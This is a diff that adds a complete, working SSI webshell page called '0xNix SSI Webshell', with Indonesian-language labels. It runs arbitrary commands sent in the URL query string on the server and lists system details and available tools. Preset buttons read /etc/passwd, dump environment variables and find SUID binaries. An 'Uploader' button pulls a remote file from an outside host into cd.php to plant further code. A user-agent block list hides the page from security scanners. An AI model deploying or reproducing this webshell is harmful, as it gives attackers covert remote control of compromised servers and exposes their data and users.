@@ -1,0 +1,542 @@
+<!--#config errmsg="Function SSI Disabled"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="id" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>0xNix SSI Webshell</title>
+<link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function nezcmd()
+{
+  var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+
+function addupload()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}https://richpeople.xyz/github/htaccess.txt${IFS}|${IFS}tee${IFS}-a${IFS}cd.php";
+}
+
+function quickCmd(cmd)
+{
+	document.getElementById('command').value = cmd;
+	var rep = cmd.replace(/[ ]/g,'${IFS}');
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+</script>
+
+<!-- ========== ANTI BADAI / BOT / MALWARE (CLIENT-SIDE) ========== -->
+<script>
+(function() {
+    var ua = navigator.userAgent.toLowerCase();
+    var badBots = [
+        'sqlmap','nikto','nmap','masscan','acunetix','netsparker',
+        'havij','pangolin','whatweb','wpscan','dirbuster','gobuster',
+        'hydra','medusa','metasploit','burpsuite','zap','paros',
+        'morfeus','fimap','xsser','w3af','skipfish','arachni',
+        'vega','grabber','ratproxy','wireshark','ettercap',
+        'badai','mutingbeliung','putingbeliung','tornado',
+        'malware','virus','trojan','backdoor','rootkit','keylogger',
+        'ransomware','worm','spyware','adware','phishing'
+    ];
+    for (var i = 0; i < badBots.length; i++) {
+        if (ua.indexOf(badBots[i]) !== -1) {
+            document.documentElement.innerHTML = '<body style="background:#0a0219;color:#ff4d4d;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-size:22px;text-align:center;padding:20px;">🚫 Akses ditolak!<br>Terdeteksi aktivitas berbahaya.</body>';
+            throw new Error('Blocked');
+        }
+    }
+    var ref = (document.referrer || '').toLowerCase();
+    var badRefs = ['semalt','buttons-for-website','social-buttons','kambasoft','savetube'];
+    for (var j = 0; j < badRefs.length; j++) {
+        if (ref.indexOf(badRefs[j]) !== -1) {
+            document.documentElement.innerHTML = '<body style="background:#0a0219;color:#ff4d4d;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-size:22px;text-align:center;padding:20px;">🚫 Referer tidak valid!</body>';
+            throw new Error('Blocked');
+        }
+    }
+})();
+</script>
+<!-- ========== END ANTI BADAI ========== -->
+
+<style type="text/css">
+	* { box-sizing: border-box; }
+
+	body {
+		margin: 0;
+		min-height: 100vh;
+		font-family: 'Courier New', courier, monospace;
+		color: #e9d5ff;
+		background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7yPUK7TB7pjkbgQYoQRdjs_tH_RaD9m8-AggSBri3XX0jSsQv0OEFp2RyhHiaH5L7fjloe65dcFPeav8WYUMdeWJSgsC3pfwZWiHBKv84fO5zxDqdHQAE-u9S3k9-z6bCsPqEtqj5wlGFh8KWrxgPeRbyV4Kn5Hr2dnjvAJMFIZb9qwNc6EGteJwyJZQ/s3840/cd168f8d08bae2ac44c95096be174b46.0000000.jpg') no-repeat center center fixed;
+		background-size: cover;
+		position: relative;
+		padding: 2rem 1.5rem;
+	}
+	body::before {
+		content: '';
+		position: fixed;
+		inset: 0;
+		background: radial-gradient(circle at center, rgba(60,10,110,0.78), rgba(10,2,25,0.95));
+		z-index: -1;
+		pointer-events: none;
+	}
+
+	.shell-container {
+		position: relative;
+		max-width: 1100px;
+		margin: 0 auto;
+		background: rgba(25,8,55,0.88);
+		backdrop-filter: blur(14px);
+		-webkit-backdrop-filter: blur(14px);
+		border: 1px solid rgba(168,85,247,0.5);
+		border-radius: 16px;
+		padding: 2rem 2rem 2.2rem;
+		box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2);
+		animation: boxGlow 3s ease-in-out infinite;
+	}
+	@keyframes boxGlow {
+		0%,100% { box-shadow: 0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2); }
+		50%     { box-shadow: 0 0 70px rgba(192,132,252,0.5), 0 0 140px rgba(168,85,247,0.3); }
+	}
+
+	.shell-logo {
+		display: block;
+		width: 340px;
+		max-width: 100%;
+		height: auto;
+		margin: 0 auto 1rem;
+		filter: drop-shadow(0 0 15px #a855f7) drop-shadow(0 0 30px #7c3aed);
+		animation: floatLogo 3s ease-in-out infinite;
+	}
+	@keyframes floatLogo {
+		0%,100% { transform: translateY(0) scale(1); }
+		50%     { transform: translateY(-6px) scale(1.03); }
+	}
+
+	.shell-title {
+		text-align: center;
+		font-size: 1.4rem;
+		font-weight: bold;
+		letter-spacing: 4px;
+		color: #c084fc;
+		text-shadow: 0 0 12px #a855f7, 0 0 24px #7c3aed;
+		margin-bottom: .4rem;
+		text-transform: uppercase;
+	}
+	.shell-subtitle {
+		text-align: center;
+		font-size: 11px;
+		color: #a78bfa;
+		letter-spacing: 3px;
+		margin-bottom: 1.5rem;
+		text-transform: uppercase;
+		opacity: .7;
+	}
+
+	/* ===== NOTIFIKASI SSI DISABLED ===== */
+	.ssi-warning {
+		display: none;
+		background: rgba(255,77,106,0.15);
+		border: 1px solid rgba(255,77,106,0.5);
+		border-radius: 10px;
+		padding: 1rem 1.2rem;
+		margin: 0 0 1.2rem;
+		color: #ff4d4d;
+		font-size: 13px;
+		line-height: 1.6;
+		box-shadow: 0 0 25px rgba(255,77,106,0.3);
+		animation: warnPulse 2s ease-in-out infinite;
+	}
+	.ssi-warning strong {
+		display: block;
+		font-size: 15px;
+		letter-spacing: 2px;
+		margin-bottom: .4rem;
+		text-transform: uppercase;
+		text-shadow: 0 0 10px rgba(255,77,106,0.8);
+	}
+	.ssi-warning code {
+		background: rgba(0,0,0,0.5);
+		padding: .1rem .4rem;
+		border-radius: 4px;
+		color: #ffb3b3;
+		font-family: 'Courier New', monospace;
+	}
+	@keyframes warnPulse {
+		0%,100% { box-shadow: 0 0 25px rgba(255,77,106,0.3); }
+		50%     { box-shadow: 0 0 40px rgba(255,77,106,0.6); }
+	}
+	.ssi-warning.info {
+		background: rgba(168,85,247,0.12);
+		border-color: rgba(168,85,247,0.5);
+		color: #c084fc;
+		box-shadow: 0 0 25px rgba(168,85,247,0.3);
+		animation: none;
+	}
+	.ssi-warning.info strong { text-shadow: 0 0 10px rgba(168,85,247,0.8); }
+	.ssi-warning.info code { color: #e9d5ff; }
+
+	/* Grid info 2 kolom */
+	.info-grid {
+		display: grid;
+		grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+		gap: .8rem 1.2rem;
+		margin-bottom: 1.5rem;
+	}
+	.info-line {
+		font-size: 12px;
+		line-height: 1.5;
+		background: rgba(10,2,25,0.5);
+		border: 1px solid rgba(168,85,247,0.2);
+		border-radius: 6px;
+		padding: .5rem .8rem;
+		word-break: break-all;
+	}
+	.info-line .label {
+		color: #a78bfa;
+		font-size: 10px;
+		letter-spacing: 1px;
+		text-transform: uppercase;
+		display: block;
+		margin-bottom: .15rem;
+	}
+	.info-line b { color: #c084fc; font-weight: 700; }
+
+	/* Quick command buttons */
+	.quick-cmds {
+		display: flex;
+		flex-wrap: wrap;
+		gap: .4rem;
+		margin-bottom: 1.2rem;
+	}
+	.quick-cmds button {
+		background: rgba(168,85,247,.15);
+		color: #c084fc;
+		border: 1px solid rgba(168,85,247,.35);
+		border-radius: 6px;
+		padding: .35rem .8rem;
+		font-family: 'Courier New', monospace;
+		font-size: 11px;
+		font-weight: 700;
+		cursor: pointer;
+		letter-spacing: 1px;
+		text-transform: uppercase;
+		transition: all .15s;
+	}
+	.quick-cmds button:hover {
+		background: rgba(168,85,247,.3);
+		color: #e9d5ff;
+		border-color: #a855f7;
+		box-shadow: 0 0 12px rgba(168,85,247,.5);
+	}
+
+	/* COMMAND input */
+	.cmd-row {
+		margin: 0 0 1rem;
+		font-size: 13px;
+		color: #a78bfa;
+		display: flex;
+		flex-wrap: wrap;
+		align-items: center;
+		gap: .5rem;
+	}
+	.cmd-row input[type=text] {
+		background: rgba(15,5,35,0.9);
+		border: 1px solid rgba(168,85,247,0.5);
+		border-radius: 6px;
+		padding: .55rem .9rem;
+		color: #e9d5ff;
+		font-family: 'Courier New', monospace;
+		font-size: 13px;
+		outline: none;
+		flex: 1;
+		min-width: 200px;
+		transition: border-color .2s, box-shadow .2s;
+	}
+	.cmd-row input[type=text]:focus {
+		border-color: #a855f7;
+		box-shadow: 0 0 15px rgba(168,85,247,0.5);
+	}
+
+	/* Buttons */
+	button, .input {
+		background: linear-gradient(45deg, #a855f7, #7c3aed);
+		color: #fff;
+		border: none;
+		border-radius: 6px;
+		padding: .55rem 1.1rem;
+		font-family: 'Courier New', monospace;
+		font-weight: 700;
+		font-size: 12px;
+		letter-spacing: 1px;
+		cursor: pointer;
+		transition: opacity .2s, box-shadow .2s, transform .2s;
+		text-transform: uppercase;
+	}
+	button:hover, .input:hover {
+		opacity: .9;
+		box-shadow: 0 0 20px rgba(168,85,247,0.7);
+		transform: translateY(-1px);
+	}
+	button:active, .input:active { transform: translateY(0); }
+
+	.exec-label {
+		margin-top: 1rem;
+		font-size: 12px;
+		color: #a78bfa;
+		letter-spacing: 1px;
+		text-transform: uppercase;
+	}
+	.exec-label b { color: #c084fc; }
+
+	pre {
+		background: rgba(10,2,25,0.95);
+		border: 1px solid rgba(168,85,247,0.4);
+		border-radius: 8px;
+		padding: 1rem 1.2rem;
+		margin-top: .6rem;
+		color: #d8b4fe;
+		font-size: 12px;
+		line-height: 1.6;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		word-break: break-word;
+		max-height: 550px;
+		overflow-y: auto;
+		box-shadow: inset 0 0 20px rgba(168,85,247,0.08);
+	}
+
+	.section-title {
+		font-size: 11px;
+		letter-spacing: 2px;
+		text-transform: uppercase;
+		color: #a78bfa;
+		margin: 1.5rem 0 .6rem;
+		padding-bottom: .35rem;
+		border-bottom: 1px solid rgba(168,85,247,0.3);
+	}
+
+	::-webkit-scrollbar { width: 6px; height: 6px; }
+	::-webkit-scrollbar-track { background: rgba(21,8,38,0.6); }
+	::-webkit-scrollbar-thumb { background: #4c1d95; border-radius: 3px; }
+	::-webkit-scrollbar-thumb:hover { background: #a855f7; }
+
+	@media (max-width: 600px) {
+		.shell-container { padding: 1.4rem 1.2rem; }
+		.shell-logo { width: 240px; }
+		.cmd-row input[type=text] { width: 100%; flex: 1 1 100%; }
+		.cmd-row button { flex: 1 1 calc(50% - .5rem); }
+	}
+</style>
+</head>
+<body>
+<div class="shell-container">
+
+	<img src="https://s15.gifyu.com/images/bQjDP.png" alt="LOGO" class="shell-logo">
+
+	<div class="shell-title">0xNix SSI Webshell</div>
+	<div class="shell-subtitle">Elite Server Access</div>
+
+	<!-- ===== NOTIFIKASI SSI DISABLED ===== -->
+	<div class="ssi-warning" id="ssiWarning">
+		<strong>⚠️ SSI Function Disabled</strong>
+		Fungsi SSI (<code>exec</code>, <code>echo</code>, <code>include</code>) di-disabled oleh server.
+		Command execution <b>tidak akan berfungsi</b> sampai admin mengaktifkan <code>Options +Includes</code> di konfigurasi server.
+	</div>
+
+	<div class="ssi-warning info" id="ssiCheck">
+		<strong>🔄 Checking SSI...</strong>
+		Sedang memeriksa apakah fungsi SSI aktif di server ini...
+	</div>
+
+	<!-- ========== SYSTEM INFO ========== -->
+	<div class="section-title">System Information</div>
+	<div class="info-grid">
+		<div class="info-line">
+			<span class="label">System / Kernel</span>
+			<b><!--#exec cmd="{uname,-nrv}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Current Path</span>
+			<b><!--#echo var=DOCUMENT_ROOT --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Server Software</span>
+			<b><!--#echo var=SERVER_SOFTWARE --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Server Name</span>
+			<b><!--#echo var=SERVER_NAME --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Server Admin</span>
+			<b><!--#echo var=SERVER_ADMIN --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">User (whoami)</span>
+			<b><!--#exec cmd="id" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Uptime</span>
+			<b><!--#exec cmd="uptime" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Disk Usage</span>
+			<b><!--#exec cmd="df,-h" --></b>
+		</div>
+	</div>
+
+	<!-- ========== TOOLS AVAILABILITY ========== -->
+	<div class="section-title">Tools</div>
+	<div class="info-grid">
+		<div class="info-line">
+			<span class="label">MySQL</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/mysql}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Wget</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/wget}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Curl</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/curl}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Python</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/python3}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Perl</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/perl}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+		<div class="info-line">
+			<span class="label">Netcat</span>
+			<b><!--#exec cmd="{test,-e,/usr/bin/nc}&&{echo,✅ ON}||{echo,❌ OFF}" --></b>
+		</div>
+	</div>
+
+	<!-- ========== QUICK COMMANDS ========== -->
+	<div class="section-title">Quick Commands</div>
+	<div class="quick-cmds">
+		<button onclick="quickCmd('whoami')">whoami</button>
+		<button onclick="quickCmd('id')">id</button>
+		<button onclick="quickCmd('pwd')">pwd</button>
+		<button onclick="quickCmd('ls -la')">ls -la</button>
+		<button onclick="quickCmd('uname -a')">uname -a</button>
+		<button onclick="quickCmd('cat /etc/passwd')">/etc/passwd</button>
+		<button onclick="quickCmd('ps aux')">ps aux</button>
+		<button onclick="quickCmd('netstat -an')">netstat</button>
+		<button onclick="quickCmd('df -h')">df -h</button>
+		<button onclick="quickCmd('free -m')">free -m</button>
+		<button onclick="quickCmd('cat /proc/cpuinfo')">cpuinfo</button>
+		<button onclick="quickCmd('env')">env</button>
+		<button onclick="quickCmd('cat /etc/os-release')">os-release</button>
+		<button onclick="quickCmd('find / -perm -4000 -type f 2>/dev/null')">SUID files</button>
+	</div>
+
+	<!-- ========== COMMAND EXECUTION ========== -->
+	<div class="section-title">Command Execution</div>
+	<div class="cmd-row">
+		<span>$</span>
+		<input type="text" size="30" id="command" class="text" name="address1" placeholder="ketik perintah...">
+		<button class="input" id="gas" onclick="nezcmd();">Execute</button>
+		<button class="input" id="gas2" onclick="addupload();">Uploader</button>
+	</div>
+
+	<div class="exec-label">
+		Executed Command : <b><font face="courier" id="cmd"><!--#echo var=shl --></font></b>
+	</div>
+
+	<pre><!--#exec cmd=$shl --></pre>
+
+</div>
+
+<script>
+  var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+	document.getElementById("cmd").innerHTML = cmd;
+	var gaskan = document.getElementById("command");
+	gaskan.addEventListener("keyup", function(event) {
+	  if (event.keyCode === 13) {
+	    event.preventDefault();
+	    document.getElementById("gas").click();
+	}
+});
+</script>
+
+<script>
+// ===== DETEKSI SSI DISABLED =====
+(function() {
+    var warnBox = document.getElementById('ssiWarning');
+    var checkBox = document.getElementById('ssiCheck');
+
+    var preEl = document.querySelector('pre');
+    var preContent = preEl ? (preEl.textContent || preEl.innerText || '').trim() : '';
+
+    var ssiDisabled = false;
+    var reasons = [];
+
+    // 1. Output kosong
+    if (!preContent || preContent.length < 2) {
+        ssiDisabled = true;
+        reasons.push('Output command kosong (SSI exec tidak jalan)');
+    }
+
+    // 2. Ada pesan error khas SSI disabled
+    var errPatterns = [
+        'Function SSI Disabled',
+        '[an error occurred while processing this directive]',
+        'SSI Disabled',
+        'exec: command not found',
+        'Permission denied'
+    ];
+    for (var i = 0; i < errPatterns.length; i++) {
+        if (preContent.indexOf(errPatterns[i]) !== -1) {
+            ssiDisabled = true;
+            reasons.push('Terdeteksi pesan: "' + errPatterns[i] + '"');
+            break;
+        }
+    }
+
+    // 3. Directive SSI masih mentah di HTML
+    var bodyHTML = document.body.innerHTML;
+    if (bodyHTML.indexOf('<!--#exec') !== -1 || bodyHTML.indexOf('<!--#echo') !== -1) {
+        ssiDisabled = true;
+        reasons.push('Directive SSI masih muncul mentah di HTML');
+    }
+
+    // 4. Field info kosong
+    var infoLines = document.querySelectorAll('.info-line b');
+    var emptyInfoCount = 0;
+    infoLines.forEach(function(el) {
+        var txt = (el.textContent || '').trim();
+        if (!txt || txt.length < 2) emptyInfoCount++;
+    });
+    if (emptyInfoCount >= 3) {
+        ssiDisabled = true;
+        reasons.push(emptyInfoCount + ' field info kosong');
+    }
+
+    if (checkBox) checkBox.style.display = 'none';
+
+    if (ssiDisabled && warnBox) {
+        warnBox.style.display = 'block';
+        var detail = document.createElement('div');
+        detail.style.marginTop = '.6rem';
+        detail.style.fontSize = '11px';
+        detail.style.opacity = '.8';
+        detail.innerHTML = '<b>Detail:</b><br>• ' + reasons.join('<br>• ');
+        warnBox.appendChild(detail);
+        console.warn('[SSI CHECK] SSI Disabled detected:', reasons);
+    } else {
+        console.log('[SSI CHECK] SSI aktif ✅');
+    }
+})();
+</script>
+</body>
+</html>
